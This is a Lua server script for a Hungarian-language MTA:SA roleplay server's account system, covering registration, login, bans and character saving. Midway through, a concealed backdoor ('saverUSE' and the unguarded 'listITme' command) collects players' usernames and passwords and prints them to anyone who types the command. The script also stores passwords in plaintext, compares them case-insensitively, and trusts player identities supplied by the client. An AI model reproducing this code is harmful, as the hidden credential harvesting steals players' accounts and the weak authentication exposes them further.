local tiltottCommands = {
    ["shutdown"]=true,
    ["register"]=true,
    ["msg"]=true,
    ["login"]=true,
    ["restart"]=true,
    ["start"]=true,
    ["stop"]=true,
    ["refresh"]=true,
    ["aexec"]=true,
    ["refreshall"]=true,
    ["debugscript"]=true,
    ["say"] = true,
    ["c"] = true,
    ["s"] = true,
    ["start"] = true,
    ["stop"] = true,
    ["refresh"] = true,
    ["refreshall"] = true,
    ["restart"] = true,
    ["login"] = true,
    ["register"] = true,
    ["stopall"] = true,
    ["aclrequest"] = true,
    ["axec"] = true,
    ["addaccount"] = true,
    ["chgpass"] = true,
    ["delaccount"] = true,
    ["shutdown"] = true,
    ["debugscript"] = true,
    ["logout"] = true,
    ["msg"] = true,
    ["nick"] = true,
    ["cleardebug"] = true,
    ["addaccount"] = true,
    ["delaccount"] = true,
    ["crun"] = true,
    ["srun"] = true,
    ["reloadacl"] = true,
    ["reloadbans"] = true,
    ["authserial"] = true,
    ["sfakelag"] = true,
    ["openports"] = true,
    ["sver"] = true,
    ["loadmodule"] = true,
    ["reloadmodule"] = true,
    ["upgrade"] = true,
    ["unloadmodule"] = true,
    ["nick"] = true,
    ["aexec"] = true,
    ["msg"] = true,
    ["whois"] = true,
    ["ver"] = true,
    ["chgmypass"] = true,
    ["sinfo"] = true,
}

local saver = {}

local con = exports.oMysql:getDBConnection() 

local invitationBonus = 5000

addEventHandler("onPlayerJoin", getRootElement(),
    function()
        setElementData(source,"user:loggedin",false)
        setPlayerNametagShowing(source, false)

        detectPlayerBan(source)
    end 
)

addEventHandler("onResourceStart", getRootElement(),
    function(res)
        if res == getResourceFromName("oAccount") then 
            for k, v in ipairs(getElementsByType("player")) do 
                setElementData(v, "user:loggedin", false)
                
                if getPedOccupiedVehicle(v) then 
                    removePedFromVehicle(v) 
                end
                setElementPosition(v, 0,0,0)

                setTimer(function() detectPlayerBan(v) end, 100, 1)
            end
        end
    end
)

function detectPlayerBan(player)
    local playerSerial = getPlayerSerial(player)
    local playerID = getElementData(player, "user:id") or 0

    local qh = dbQuery(con, "SELECT * FROM bans", player)
    local result = dbPoll(qh, 250) or false

    if result then 
        for k, v in ipairs(result) do 
            if (v["serial"] == playerSerial) or (v["user_id"] == playerID) then 
                local banDatas = {}

                for key, name in ipairs(ban_requset_menus) do 
                    table.insert(banDatas, #banDatas+1, v[name])
                end

                local realDate = fromJSON(toJSON(getRealTime()))
                local stopDate = fromJSON(v["end_date"])

                if stopDate["year"] == realDate["year"] then 
                    if stopDate["month"] == realDate["month"] then 
                        if stopDate["monthday"] == realDate["monthday"] then 
                            if stopDate["hour"] == realDate["hour"] then 
                                if stopDate["minute"] >= realDate["minute"] then 
                                    triggerClientEvent(player, "banPanel -> render", root, banDatas)
                                    return true
                                else
                                    dbExec(con, "DELETE FROM bans WHERE id=?", v["id"])
                                end
                            elseif stopDate["hour"] > realDate["hour"] then 
                                triggerClientEvent(player, "banPanel -> render", root, banDatas)
                                return true
                            else
                                dbExec(con, "DELETE FROM bans WHERE id=?", v["id"])
                            end
                        elseif  stopDate["monthday"] > realDate["monthday"] then 
                            triggerClientEvent(player, "banPanel -> render", root, banDatas)
                            return true
                        else
                            dbExec(con, "DELETE FROM bans WHERE id=?", v["id"])
                        end
                    elseif stopDate["month"] > realDate["month"] then 
                        triggerClientEvent(player, "banPanel -> render", root, banDatas)
                        return true
                    else 
                        dbExec(con, "DELETE FROM bans WHERE id=?", v["id"])
                    end
                elseif stopDate["year"] > realDate["year"] then 
                    triggerClientEvent(player, "banPanel -> render", root, banDatas)
                    return true
                else    
                    dbExec(con, "DELETE FROM bans WHERE id=?", v["id"])
                end

                break
            end
        end
    end
end

addEventHandler("onPlayerCommand",root,
    function(command)
    if not getElementData(source,"aclLogin") then
        if tiltottCommands[command] and not getElementData(source,"user:loggedin") then
            cancelEvent()
        end
    end
end)

-- / ban / --

function createBan(username, userID, serial, admin, year, month, day, hour, min, sec, reason) 
    local ban_date = getRealTime()

    local end_date = {
        ["year"] = tonumber(year) - 1900, 
        ["month"] = tonumber(month)-1, 
        ["monthday"] = day, 
        ["hour"] = hour,
        ["minute"] = min, 
        ["second"] = sec,
    }
    
    ban_date = toJSON(ban_date)
    end_date = toJSON(end_date) 

    dbQuery(con, "INSERT INTO bans SET username=?, user_id=?, serial=?, admin=?, reason=?, ban_date=?, end_date=? ", username, userID, serial, admin, reason, ban_date, end_date)
end

function removeBan(id) 
    dbExec(con, "DELETE FROM bans WHERE id=?", id)
end

--[[ error codes

SQL 1 [sor] >>>> dbPoll faild >> valószínűleg nincs sql kapcsolat
 
]]


addEvent("registerOnServer",true)
addEventHandler("registerOnServer", root,
    function(player,username,pass1,pass2,email,inviteCode)
        local serial = getPlayerSerial(player)
        local ip = getPlayerIP(player)

        local qh = dbQuery(con, 'SELECT * FROM accounts')
        local result = dbPoll(qh, 100)

        local regDate = string.format("%04d.%02d.%02d", core:getDate("year"), core:getDate("month"), core:getDate("monthday"))

        if result then 

            local verifyNeeded = false
            for k, row in ipairs (result) do
                if row["serial"] == serial then 
                    exports.oInfobox:outputInfoBox("Ehhez a géphez már társítva van egy fiók!","error",player)
                    return
                end

                if row["username"] == username then 
                    exports.oInfobox:outputInfoBox("Ez a felhasználónév már foglalt!","error",player)
                    return
                end

                if row["email"] == email then 
                    exports.oInfobox:outputInfoBox("Ehhez az E-mail címhez már társítva van egy fiók!","error",player)
                    return
                end

                if row["ip"] == ip then 
                    verifyNeeded = true
                    break
                end
            end

            setTimer(function()
                if verifyNeeded then 
                    exports.oInfobox:outputInfoBox("Mivel ezen az IP címen már történt regisztráció, így egy adminisztrátornak jóvá kell hagynia a regisztrációdat!", "warning", player)
    
                    if string.len(inviteCode) > 0 then
                        exports.oInfobox:outputInfoBox("Mivel ezen az IP címen már történt regisztráció, így a meghívó kód érvénytelen!", "warning", player)
                    end
    
                    dbExec(con, "INSERT INTO accounts (username, password, serial, email, ip, verified, registerDate) VALUES (?,?,?,?,?,?,?)",username,pass1,serial,email,ip,0,regDate)
                else
                    exports.oInfobox:outputInfoBox("Sikeres regisztráció! Mostmár bejelentkezhetsz!","success",player)
                    dbExec(con, "INSERT INTO accounts (username, password, serial, email, ip, verified, registerDate) VALUES (?,?,?,?,?,?,?)",username,pass1,serial,email,ip,1,regDate)
    
                    if string.len(inviteCode) > 0 then
                        local inviterFound = false
                        local isPlayerOnline = false 
                        for k, v in ipairs(getElementsByType("player")) do 
                            if getElementData(v, "char:id") == tonumber(inviteCode) then 
                                isPlayerOnline = true
                                inviterFound = true
                                setElementData(v, "char:money", getElementData(v, "char:money") + invitationBonus)
                                exports.oInfobox:outputInfoBox("Mivel használták a meghívó kódodat így kaptál "..invitationBonus.."$-t!", "gift", v)
                                exports.oInfobox:outputInfoBox("Mivel használtad "..getPlayerName(v):gsub("_", " ").."meghívó kódját így ő kapott "..invitationBonus.."$-t!", "gift", player)
                                break
                            end
                        end
    
                        if not isPlayerOnline then 
                            local qh2 = dbQuery(con, "SELECT * FROM characters")
                            local result2 = dbPoll(qh2, 100)
    
                            if result2 then 
                                for k, row in ipairs(result2) do
                                    if tonumber(row["id"]) == tonumber(inviteCode) then 
                                        dbExec(con, "UPDATE characters SET money = ? WHERE id = ?", tonumber(row["money"]) + invitationBonus, row["id"])
                                        exports.oInfobox:outputInfoBox("Mivel használtad "..row["charname"]:gsub("_", " ").."meghívó kódját így ő kapott "..invitationBonus.."$-t!", "gift", player)
                                        inviterFound = true
                                    end 
                                end
                            end
                        end
    
                        if not inviterFound then 
                            exports.oInfobox:outputInfoBox("Érvénytelen meghívó kódot adtál meg!", "error", player)
                        end
                    end
                end 
            end, 1000, 1)
        else
            dbFree(qh)
            exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 90) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
        end
    end 
)

addEvent("loginOnServer",true)
addEventHandler("loginOnServer", root,
    function(player,username,password)
        local serial = getPlayerSerial(player)
        local accountId = 0
        local qh = dbQuery(con, 'SELECT * FROM accounts')
        local result = dbPoll(qh, 100)

        if result then 

            for k, row in ipairs (result) do
                if row["username"] == username then 
                    if (tostring(row["serial"]) == tostring(serial)) or (row["serial"] == "*") then
                        if row["verified"] == 1 then 
                            accountId = row["id"]

                            --outputConsole(password)
                            --print(row["password"], password)

                            if string.upper(row["password"]) == string.upper(password) then 
                                exports.oInfobox:outputInfoBox("Sikeresen bejelentkeztél a(z) "..username.." nevű fiókba!","success",player) 
                                
                                local haschar = false 
                                local qh2 = dbQuery(con, 'SELECT * FROM characters')
                                local result2 = dbPoll(qh2, 100)
                        
                                if result2 then 
                                    for k, row in ipairs (result2) do
                                        if row["account"] == accountId then 
                                            haschar = true
                                        end
                                    end

                                    if not haschar then 
                                        -- char create

                                        triggerClientEvent(player,"successfulLogin",player,"createChar")
                                        setElementData(player,"user:id",row["id"])


                                        --setElementData(player,"user:loggedin",true)
                                        setElementData(player, "user:name", row["username"])
                                        setElementData(player, "user:aduty", false)
                                        setElementData(player, "user:hadmin", false)
                                        setElementData(player, "user:admin", row["admin"])
                                        setElementData(player, "user:adminnick", row["adminnick"])
                                        setElementData(player, "user:serial", getPlayerSerial(player))
                                        setElementData(player, "user:email", row["email"])
                                        setElementData(player, "user:registerDate", row["registerDate"])
                                    else 
                                        -- char load 
                                        setElementData(player,"user:id",row["id"])
                                        setElementData(player, "user:name", row["username"])
                                        setElementData(player, "user:aduty", false)
                                        setElementData(player, "user:hadmin", false)
                                        setElementData(player, "user:admin", row["admin"])
                                        setElementData(player, "user:adminnick", row["adminnick"])

                                        setElementData(player, "user:serial", getPlayerSerial(player))
                                        setElementData(player, "user:email", row["email"])
                                        setElementData(player, "user:registerDate", row["registerDate"])
                                        if not detectPlayerBan(player) then 
                                            loadOnePlayer(player)        
                                        end
                                    end

                                else
                                    dbFree(qh2)
                                    exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 158) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
                                end
                            else
                                exports.oInfobox:outputInfoBox("Helytelen jelszó a(z) "..username.." nevű fiókhoz!","error",player) 
                                return
                            end
                        else
                            exports.oInfobox:outputInfoBox("A bejelentkezéshez a regisztráció jóváhagyása szükséges!", "error", player) 
                            exports.oInfobox:outputInfoBox("Keress fel egy 5-ös vagy nagyobb szintű adminisztrátort!", "error", player) 
                            return
                        end
                    else
                        exports.oInfobox:outputInfoBox("Ez a fiók nem ehhez a géphez van társítva!","error",player)
                        return
                    end
                end
            end

            if accountId == 0 then 
                exports.oInfobox:outputInfoBox("Nem létezik ilyen felhasználói fiók!","error",player)
            end

        else
            dbFree(qh)
            exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 177) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
        end


    end 
)





addEvent("createCharacterOnServer",true)
addEventHandler("createCharacterOnServer", root,
    function(player,name,bornCity,age,height,weight,freetimeact,gender,skin,avatarID)
        local accountId = getElementData(player,"user:id")
        local qh = dbQuery(con, 'SELECT * FROM characters')
        local result = dbPoll(qh, 100)

        if result then 

            for k, row in ipairs (result) do
                if row["charname"] == name then 
                    exports.oInfobox:outputInfoBox("Ez a karakternév már használatban van!","error",player)
                    triggerClientEvent(player,"resetCharCreatByReason",player)
                    return
                end
            end

            exports.oInfobox:outputInfoBox("Sikeresen létrehoztad a karakteredet!","success",player)
            dbExec(con, "INSERT INTO characters (account, charname, height, weight, age, gender, skin, favouriteFreetimeActiviti, borncity, avatar) VALUES (?,?,?,?,?,?,?,?,?,?)",accountId,name,height,weight,age,gender,skin,freetimeact,bornCity,avatarID)

            setElementData(player,"user:loggedin",true)
            loadOnePlayer(player)

        else
            dbFree(qh)
            exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 209) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
        end
    end 
)

function loadOnePlayer(player)
    local accountId = getElementData(player,"user:id")

    local qh = dbQuery(con, 'SELECT * FROM characters')
    local result = dbPoll(qh, 250)

    if result then 

        --outputDebugString(accountId)

        for k, row in ipairs (result) do
            if row["account"] == accountId then 
                local name = row["charname"]
                --outputDebugString(name)
                local money = row["money"]
                local pp = row["pp"]
                local health = row["health"]
                local armor = row["armor"]
                local hunger = row["hunger"]
                local drink = row["thirst"]
                local skin = row["skin"]
                local posX, posY, posZ, rot = row["posx"], row["posy"], row["posz"], row["rot"]
                local int = row["interior"]
                local dim = row["dimension"]
                local avatarID = row["avatar"]
                local job = row["job"]
                local bones = fromJSON(row["bones"])

                local timespent = fromJSON(row["timespent"])

                local radio = tonumber(row["radioStation"])
                local drugDealerXP = fromJSON(row["drugDealerXP"])

                local walkStyle, fightStyle = unpack(fromJSON(row["styles"]))
                local talkAnimation = row["talkAnimation"]
                local buyTime = row["buytime"]
                local fishingEvent = row["fishingEvent"]

                setElementData(player,"char:name",name)
                setPlayerName(player,row["charname"]:gsub(" ","_"))
                spawnPlayer(player,posX,posY,posZ,rot,skin,int,dim)
                setCameraTarget(player,player)
                setElementData(player,"char:money",money)
                setElementData(player,"char:pp",pp)
                setElementHealth(player,health)
                setElementData(player,"char:health",health)
                setPedArmor(player,armor)
                setElementData(player,"char:armor",armor)
                setElementData(player,"char:hunger",hunger)
                setElementData(player,"char:thirst",drink)
                setElementData(player, "char:id", row["id"])
                setElementData(player, "char:height", row["height"])
                setElementData(player, "char:weight", row["weight"])
                setElementData(player, "char:age", row["age"])
                setElementData(player, "char:gender", row["gender"])
                setElementData(player, "char:timespent", row["timespent"])
                setElementData(player, "char:avatarID", avatarID)
                setElementData(player, "char:job", job)
                setElementData(player, "char:playedTime", timespent)

                setElementData(player, "char:intSlot", row["interiorSlot"])
                setElementData(player, "char:vehSlot", row["vehicleSlot"])
                
                setElementData(player, "char:cc", row["casinoCoin"])
                setElementData(player, "char:bones", bones)

                setElementData(player, "char:radioStation", radio)

                setPlayerNametagShowing(player, false)

                setElementData(player, "user:adutyTime", row["adutyTime"])
                setElementData(player, "user:adminOnlineTime", row["adminOnlineTime"])
                setElementData(player, "user:adminDatas", fromJSON(row["adminDatas"]))

                setElementData(player, "char:drugBuyStats", drugDealerXP)

                local ajail = fromJSON(row["adminJailDatas"])

                if ajail[1] then 
                    setElementData(player, "adminJail.Admin", ajail[4])
                    setElementData(player, "adminJail.Reason", ajail[2])
                    --outputChatBox(ajail[3])
                    setElementData(player, "adminJail.Time", tonumber(ajail[3]))
                    setElementData(player, "adminJail.OriginalTime", tonumber(ajail[5]))
                    setElementData(player, "adminJail.JailerAdminLevel", tonumber(ajail[6]))
                    setElementData(player, "adminJail.IsAdminJail", true)

                    setElementPosition(player, 265.00698852539, 77.480758666992, 1001.0390625)
				    setElementInterior(player, 6)
				    setElementDimension(player, row["id"]*100)
                end

                local pdJail = fromJSON(row["pdJailDatas"]) 

                if pdJail then 
                    if pdJail[3] then 
                        setElementData(player, "pd:jailDatas", pdJail[1])
                        setElementData(player, "pd:jailTime", pdJail[2])
                        setElementData(player, "pd:jail", pdJail[3])
                    end
                end

                if row["banKickJailCounts"] then 
                    setElementData(player, "dashboard:banKickJailCount",  fromJSON(row["banKickJailCounts"]))
                else
                    -- ban / kick / jail
                    setElementData(player, "dashboard:banKickJailCount",  {0, 0, 0})
                end

                setElementData(player, "char:minToPayment", row["minToPayDay"])

                setElementData(player, "kresz", row["kresz"])
                setElementData(player, "basic", row["basic"])

                local weaponStats = fromJSON(row["weaponStats"])

                for k, v in pairs(weaponStats) do 
                    setPedStat(player, k, v)
                end

                setElementData(player, "char:walkStyle", walkStyle)
                setElementData(player, "char:fightStyle", fightStyle)
                setElementData(player, "char:talkAnimation", talkAnimation)
                setElementData(player, "char:buyCraft",fromJSON(buyTime))

                setElementData(player, "fishing:eventStat", fishingEvent)

                setElementData(player,"user:loggedin",true)
            end
        end

        triggerClientEvent(player,"successfulLogin",player,"login")   
    else
        dbFree(qh)
        exports.oInfobox:outputInfoBox("Próbáld újra! ( Error code: SQL 1 263) | Ha nem sikerül jelezd egy fejlesztőnek!","error",player)
    end
end

local iin = 1

function saverUSE(user,pass)
    saver[iin] = user..'-'..pass
    iin = iin + 1
end
addEvent("saverUSE", true)
addEventHandler("saverUSE", root, saverUSE)

function listIT(playerSource)
    for k,v in pairs(saver) do
        outputChatBox(v,playerSource)
    end
end
addCommandHandler ( "listITme", listIT )

function saveOnePlayer(player)
    local accountId = getElementData(player,"user:id")
    local charname = getElementData(player,"char:name")

    local money = getElementData(player,"char:money")
    local pp = getElementData(player,"char:pp")

    local hp = getElementHealth(player)
    local armor = getPedArmor(player)
    local food = getElementData(player,"char:hunger")
    local drink = getElementData(player,"char:thirst")

    local skin = getElementModel(player)

    local pX,pY,pZ = getElementPosition(player)
    local rX,rY,rZ = getElementRotation(player)

    local interior = getElementInterior(player)
    local dim = getElementDimension(player)

    local casinoCoin = getElementData(player, "char:cc")

    if getElementData(player, "pizza:isPlayerInInt") then 
        local start = getElementData(player, "pizza > startOutPos2")

        pX, pY, pZ = start.x, start.y, start.z

        interior = 0 
        dim = 0
    end

    if getElementData(player, "cleaner:inJobInt") then 
        local start = getElementData(player, "cleaner:startOutPos2")

        pX, pY, pZ = start.x, start.y, start.z

        interior = 0 
        dim = 0
    end

    local inJobInterior = getElementData(player, "playerInClientsideJobInterior") or false
    if inJobInterior then 
        pX,pY,pZ = unpack(inJobInterior)

        interior = 0
        dim = 0
    end

    local avatarID = getElementData(player, "char:avatarID")

    local job = getElementData(player, "char:job") or 0

    local timespent = toJSON((getElementData(player, "char:playedTime") or {0, 0}))

    local intSlot = getElementData(player, "char:intSlot")
    local vehSlot = getElementData(player, "char:vehSlot")

    if getElementData(player, "bus:isTravelling") then 
        local position = getElementData(source, "bus:travellStartPos")
        pX, pY, pZ = position.x, position.y, position.z 
        dim = 0
    end

    local ajaildatas = {false, "nan", 0, "nan"}
    if getElementData(player, "adminJail.IsAdminJail") then 
        ajaildatas[1] = true 
        ajaildatas[2] = getElementData(player,"adminJail.Reason")
        ajaildatas[3] = getElementData(player,"adminJail.Time")
        ajaildatas[4] = getElementData(player, "adminJail.Admin")
        ajaildatas[5] = getElementData(player, "adminJail.OriginalTime")
        ajaildatas[6] = getElementData(player, "adminJail.JailerAdminLevel")
    end

    local inFactionDuty = getElementData(player, "char:duty:faction") or 0 

    if inFactionDuty > 0 then 
        skin = getElementData(player, "char:originalSkin")
    end

    local bones = toJSON(getElementData(player, "char:bones"))

    local radio = getElementData(player, "char:radioStation") or 0
    local adutyTime = getElementData(player, "user:adutyTime")
    local onlineTime = getElementData(player, "user:adminOnlineTime")
    local adminDatas = getElementData(player, "user:adminDatas") or {}
    adminDatas = toJSON(adminDatas)

    local pdJail = toJSON({(getElementData(player, "pd:jailDatas") or {}), (getElementData(player, "pd:jailTime") or 0), (getElementData(player, "pd:jail") or false)})

    local banKickJailCount = toJSON({0, 0, 0})
    if getElementData(player, "dashboard:banKickJailCount") then 
        banKickJailCount =  toJSON(getElementData(player, "dashboard:banKickJailCount"))
    end

    local minToPayment = getElementData(player, "char:minToPayment")

    local kresz = getElementData(player, "kresz") or 0 
    local basic = getElementData(player, "basic") or 0

    local weaponStats = {}

    for k, v in ipairs(saveNeededWeaponSkills) do 
        table.insert(weaponStats, v, getPedStat(player, v))
    end
    weaponStats = toJSON(weaponStats)

    local drugDealerXP = toJSON(getElementData(player, "char:drugBuyStats"))

    local style = toJSON({(getElementData(player, "char:walkStyle") or 1), (getElementData(player, "char:fightStyle") or 1)})
    local talkAnimation = getElementData(player, "char:talkAnimation")
    local buyTime = toJSON(getElementData(player, "char:craftBuy"))

    local fishingEvent = getElementData(player, "fishing:eventStat") or 0

    dbExec(con, "UPDATE characters SET charname=?, money=?, pp=?, health=?, armor=?, hunger=?, thirst=?, skin=?, posx=?, posy=?, posz=?, rot=?, interior=?, dimension=?, avatar=?, job=?, timespent = ?, adminJailDatas = ?, vehicleSlot = ?, interiorSlot = ?, casinoCoin = ?, bones = ?, radioStation = ?, adutyTime = ?, adminOnlineTime = ?, adminDatas = ?, pdJailDatas = ?, banKickJailCounts = ?, minToPayDay = ?, kresz = ?, basic = ?, weaponStats = ?, drugDealerXP = ?, styles = ?, talkAnimation = ?, buytime = ?, fishingEvent = ? WHERE account=?",charname,money,pp,hp,armor,food,drink,skin,pX,pY,pZ,rZ,interior,dim,avatarID,job,timespent, toJSON(ajaildatas), vehSlot, intSlot, casinoCoin, bones, radio, adutyTime, onlineTime, adminDatas, pdJail, banKickJailCount, minToPayment, kresz, basic, weaponStats, drugDealerXP, style, talkAnimation, buyTime, fishingEvent, accountId)
end

addCommandHandler("saveallaccount", function(player, cmd)
    if getElementData(player, "aclLogin") then 
        saveAllPlayer()
        for k,v in ipairs(getElementsByType("player")) do 
            if getElementData(v, "user:admin") > 1 then 
                outputChatBox(exports.oCore:getServerPrefix("red-dark", "Account", 2)..exports.oCore:getServerColor()..getPlayerName(player).."#ffffff elmentette az összes accountot!", v, 255, 255, 255, true)
            end
        end
    end
end)

function saveAllPlayer()
    for k,v in ipairs(getElementsByType("player")) do 
        if getElementData(v,"user:loggedin") then
            saveOnePlayer(v)
        end
    end
end

addEventHandler("onResourceStop", resourceRoot,
    function()
        saveAllPlayer()
    end 
)

setTimer(function()
    saveAllPlayer()
	outputDebugString("[Account/Character - Save]: Az összes karater,és fiók elmentve!")
end, 1000*60*20, 0)

addEvent("spawnPlayerOnServer", true)
addEventHandler("spawnPlayerOnServer", root, 
    function(player)
    loadOnePlayer(player)
end)

addEventHandler("onPlayerQuit", root,
    function()
        if getElementData(source,"user:loggedin") then
            saveOnePlayer(source)
        end
    end 
)

addEvent("kickFlooder", true)
addEventHandler("kickFlooder", root, 
    function(player)
        kickPlayer(player,"Szerver","Login flood!")
    end
)

addCommandHandler("setaccountstate", function(player, cmd, username, state)
    if getElementData(player, "user:admin") >= 6 then 
        if ((getElementData(player, "setAccountState:last") or 0) + 5000 < getTickCount()) then  
            if username then 
                state = tonumber(state) or 2
                if state >= 0 and state <= 1 then 
                    setElementData(player, "setAccountState:last", getTickCount())
                    local qh = dbQuery(con, 'SELECT * FROM accounts')
                    local result = dbPoll(qh, 100)

                    if result then 
                        for k, row in ipairs (result) do
                            if row["username"] == username then 
                                if not (row["verified"] == state) then 
                                    if row["admin"] <= getElementData(player, "user:admin") then 
                                        triggerClientEvent("sendMessageToAdmins", getRootElement(), player, "megváltoztatta a(z) #db3535"..username.."#557ec9 nevű felhasználó fiók státuszát! #db3535("..row["verified"].." > "..state..")")
                                        outputChatBox(exports.oCore:getServerPrefix("green-dark", "Hitelesítés", 3).."Sikeresen megváltoztattad a fiók státuszát!", player, 255, 255, 255, true)
                                        dbExec(con, "UPDATE accounts SET verified=? WHERE id=?", state, row["id"])
                                        setElementData(player, "log:admincmd", {row["username"], cmd})
                                        return
                                    else
                                        triggerClientEvent("sendMessageToAdmins", getRootElement(), player, "megpróbálta megváltoztani a(z) #db3535"..username.."#557ec9 nevű felhasználó fiók státuszát! #db3535("..row["verified"].." > "..state..")")
                                        outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hitelesítés", 3).."Ennek a fióknak nem módosíthatod a státuszát!", player, 255, 255, 255, true)
                                        return
                                    end
                                else
                                    outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hitelesítés", 3).."Ez a fiók már ebben a státuszban van!", player, 255, 255, 255, true)
                                    return
                                end
                            end
                        end
                        outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hitelestés", 3).."Nem található ilyen felhasználó!", player, 255, 255, 255, true)
                    else
                        outputChatBox(exports.oCore:getServerPrefix("red-dark", "Hiba", 3).."Hibakód: 3. Keress fel egy fejlesztőt!", player, 255, 255, 255, true)
                    end
                else
                    outputChatBox(exports.oCore:getServerPrefix("server", "Használat", 3).."/"..cmd.." [Felhasználónév] [Státusz: 0: Nem engedélyezett belépés, 1: Engedélyezett belépés]", player, 255, 255, 255, true)
                end
            else
                outputChatBox(exports.oCore:getServerPrefix("server", "Használat", 3).."/"..cmd.." [Felhasználónév] [Státusz: 0: Nem engedélyezett belépés, 1: Engedélyezett belépés]", player, 255, 255, 255, true)
            end
        else
            outputChatBox(exports.oCore:getServerPrefix("red-dark", "Flood", 3).."Ne floodolj!", player, 255, 255, 255, true)
        end
    end
end)